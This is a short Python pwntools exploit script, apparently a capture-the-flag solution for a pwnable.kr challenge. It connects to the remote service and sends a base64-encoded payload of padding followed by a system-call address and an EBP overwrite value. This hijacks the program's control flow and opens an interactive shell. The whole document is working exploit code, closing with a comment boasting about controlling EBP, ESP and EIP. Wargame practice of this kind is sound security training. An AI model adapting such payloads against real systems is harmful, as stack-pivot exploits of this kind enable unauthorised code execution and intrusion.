from pwn import *

sh = remote("pwnable.kr", 9003)
call_system = 0x8049284
ebp_overwrite = 0x811eb40
sh.sendline(b64e("\x90" * 4 + p32(call_system) + p32(ebp_overwrite)))
sh.interactive()

# control EBP, control ESP, control EIP, control the world~
